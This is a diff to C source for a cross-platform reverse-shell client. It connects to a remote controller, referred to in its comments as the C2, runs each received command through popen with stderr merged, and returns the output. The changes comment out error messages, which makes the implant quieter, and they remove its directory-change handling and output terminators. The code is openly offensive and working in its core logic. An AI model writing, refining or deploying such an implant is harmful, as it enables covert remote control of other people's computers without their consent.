@@ -49,7 +49,7 @@ int main (int argc, char *argv[]){
         //printf("[*] Machine detected: WINDOWS\n");
         //printf("[*] Initializing WinSocket...\n");
         if (WSAStartup(MAKEWORD(2,2), &wsa) != 0){
-            printf("[!] Failed to initialized, ERROR: %d\n", WSAGetLastError());
+            //printf("[!] Failed to initialized, ERROR: %d\n", WSAGetLastError());
             return 1;
         }
     #else
@@ -79,7 +79,7 @@ int main (int argc, char *argv[]){
     // 5. ESTABLISH CONNECTION
     // Returns < 0 if connection is refused or unreachable
     if (connect(soc, (struct sockaddr *)&server, sizeof(server)) < 0 ){
-        //1printf("[!] Connection Failed to %s:%d\n", targetIp, targetPort);
+        //printf("[!] Connection Failed to %s:%d\n", targetIp, targetPort);
         return 1;
     }
 
@@ -113,38 +113,13 @@ int main (int argc, char *argv[]){
 
         // Strip trailing newlines from the received command
         buffer[strcspn(buffer, "\n")] = 0;
-        buffer[strcspn(buffer, "\r")] = 0;
+
         // 7. ERROR HANDLING & REDIRECTION
         // Create a new string to hold "command 2>&1"
         // This merges Stderr (Errors) into Stdout so the C2 sees error messages
-        //char final_cmd[1100];
-        //sprintf(final_cmd, "%s 2>&1", buffer);
-        
-        if (strncmp(buffer, "cd ", 3) == 0){
-            char *path = buffer + 3;
-            int chdir_result;
-            #ifdef _WIN32
-                chdir_result = _chdir(path);
-            #else
-                chdir_result = chdir(path);
-            #endif
-        
-            if (chdir_result == 0 ){
-                char *success_msg = "[+] Directory changed.\n";
-                send (soc, success_msg, 22, 0);
-            }
-            else{
-                char *fail_msg = "[-] Failed to change directory.\n";
-                send(soc, fail_msg, 31, 0);
-            }
-
-            send(soc,"<END>",5,0);
-
-            continue;
-        }
-
         char final_cmd[1100];
         sprintf(final_cmd, "%s 2>&1", buffer);
+        
         // 8. EXECUTE COMMAND
         // 'popen' opens a process as a file stream ("r" = read mode)
         FILE *file;
@@ -173,9 +148,6 @@ int main (int argc, char *argv[]){
         #else
             pclose(file);
         #endif
-        
-        send(soc,"<END>",5,0);
-
     }
 
     // 10. CLEANUP
